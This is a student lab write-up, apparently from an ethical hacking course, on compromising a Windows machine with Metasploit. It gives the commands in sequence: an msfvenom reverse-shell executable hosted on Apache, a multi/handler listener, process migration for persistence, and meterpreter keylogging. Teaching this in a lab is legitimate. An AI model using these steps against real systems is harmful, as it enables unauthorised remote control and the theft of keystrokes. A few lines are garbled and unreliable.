# Compromising-windows-using-Metasploit
# AIM:
To Compromise windows using Metasploit .
## DESIGN STEPS:

- `Step 1:` Install kali linux either in partition or virtual box or in live mode
- `Step 2:` Investigate on the various categories of tools as follows:
- `Step 3:` Open terminal and try execute some kali linux commands


  

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![ethical_6 1](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/b475e147-74c7-4e34-be25-d4820f93b867)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

![ethical_6 2](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/4dec2572-ff3e-491e-8025-038022269eb9)


copy the fun.exe into the apache /var/www/html folder

![ethical_6 3](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/769e78fe-55be-4369-9094-786c2dd460ac)


Start apache server sudo systemctl apache2 start

![ethical_6 4](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/d74a83d7-becb-41f6-87a4-f4aec47fada5)

Check the status of apache2

1


Invoke msfconsole:
msfconsole

![ethical_6 5](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/bb77d7c3-ea23-46d0-95e5-1bc63dc8b597)



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


![ethical_6 6](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/021b73fe-0c10-4f8c-bab0-167650e6cf53)


Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![ethical_6 7](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/0ace7b2e-ea18-4b21-9888-796c11ee0caf)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![ethical_6 8](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/9d8ab975-5ddd-42e7-9fb0-ceebad2771cc)


Bypass any warning boxes, double-click the file, and allow it to run.

![ethical_6 9](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/42179281-73e2-4768-9e85-166c2489ba21)



On kali give the command exploit
![ethical_6 10](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/65968bd8-ad25-4b9e-b67b-2d1cc981cfb0)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![ethical_6 11](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/bf35eb36-f20c-4be7-83a9-79015aa2edc1)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![ethical_6 12](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/3fc4ec5e-4ee0-4144-8175-1bba188f064f)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![ethical_6 13](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/27da9493-74af-4eef-8bd9-12cca82c15ca)

![ethical_6 14](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/a5c2bde8-be7c-47d3-9d59-f7d1e1407754)


keyscan_dump Shows the keystrokes captured so far.

![ethical_6 15](https://github.com/gummadileepkumar/Compromising-windows-using-Metasploit/assets/118707761/315574a7-5fc8-490f-b255-44857e3a6f77)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
